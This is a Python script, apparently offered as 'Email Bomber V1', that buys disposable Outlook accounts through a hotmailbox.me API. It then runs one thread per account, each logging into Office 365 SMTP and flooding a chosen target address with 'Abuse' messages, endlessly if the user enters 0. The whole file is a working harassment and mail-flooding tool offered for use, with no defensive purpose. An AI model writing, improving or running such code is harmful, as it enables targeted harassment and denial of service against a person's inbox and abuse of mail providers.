from colorama import Fore
import threading
import requests
import smtplib
import random
import string
import json
import sys


def send_email(emailpass, target, msg, amount1):
    global emailsent
    if amount1 == 0:
        while True:
            randstring = ''.join(random.choices(string.ascii_lowercase+string.ascii_uppercase+string.digits, k=5))
            email = emailpass.split(":")[0]
            password = emailpass.split(":")[1]
            s = smtplib.SMTP("smtp.office365.com", 587)
            message = f"From: {email}\nTo: {target}\nSubject: Abuse\n{msg} {randstring}"
            s.ehlo()
            s.starttls()
            s.ehlo()
            s.login(email, password)
            s.sendmail(email, target, message)
            emailsent += 1
            print(f"{Fore.WHITE}|>|{Fore.GREEN}Sent email to {target} from {email} {emailsent}")
    else:
        for i in range(amount1):
            randstring = ''.join(random.choices(string.ascii_lowercase+string.ascii_uppercase+string.digits, k=5))
            email = emailpass.split(":")[0]
            password = emailpass.split(":")[1]
            s = smtplib.SMTP("smtp.office365.com", 587)
            message = f"From: {email}\nTo: {target}\nSubject: Abuse | {randstring} | http://owl-services.cf\n{msg} {randstring}"
            s.ehlo()
            s.starttls()
            s.ehlo()
            s.login(email, password)
            s.sendmail(email, target, message)
            emailsent += 1
            print(f"{Fore.WHITE}|>|{Fore.GREEN}Sent email to {target} from {email} {emailsent}")
        

if __name__ == "__main__":
    if json.loads(open("config.json", "r").read())["hotmailbox_api_key"]:
        hotmailbox_api_key = json.loads(open("config.json", "r").read())["hotmailbox_api_key"]
    else:
        print(f"{Fore.WHITE}|>|{Fore.RED}Error loading hotmailbox api key from config.json")
        sys.exit()
    print(f"""{Fore.YELLOW}
                                   ,/
                                 ,'/
                               ,' /
                             ,'  /_____,   ┏━━━━━━━━━━━━━━━━━━━━━━┓
                           .'____    ,'    ┃{Fore.WHITE}Email Bomber V1{Fore.YELLOW}       ┃
                                /  ,'      ┃{Fore.WHITE}by King Herod  {Fore.YELLOW}       ┃
                               / ,'        ┃{Fore.WHITE}http://owl-services.cf{Fore.YELLOW}┃
                              /,'          ┗━━━━━━━━━━━━━━━━━━━━━━┛
                             /'
    """)
    amount = input(f"{Fore.WHITE}|>|{Fore.YELLOW}How many emails to spam with: ")
    amount1 = int(input(f"{Fore.WHITE}|>|{Fore.YELLOW}How many emails should each email send (0 for inf): "))
    target = input(f"{Fore.WHITE}|>|{Fore.YELLOW}Targets email: ")
    msg = input(f"{Fore.WHITE}|>|{Fore.YELLOW}Spam message: ")


    emailpasslist = []
    emailsx = requests.get(f"https://api.hotmailbox.me/mail/buy?apikey={hotmailbox_api_key}&mailcode=OUTLOOK&quantity={amount}").json()
    for emailpass in emailsx["Data"]["Emails"]:
        print(f"{Fore.WHITE}|>|{Fore.GREEN}GOT EMAIL:{Fore.WHITE}"+emailpass["Email"]+":"+emailpass["Password"])
        emailpasslist.append(emailpass["Email"]+":"+emailpass["Password"])

    emailsent = 0
    for emailpass in emailpasslist:
        threading.Thread(target=send_email, args=(emailpass, target, msg, amount1,)).start()    
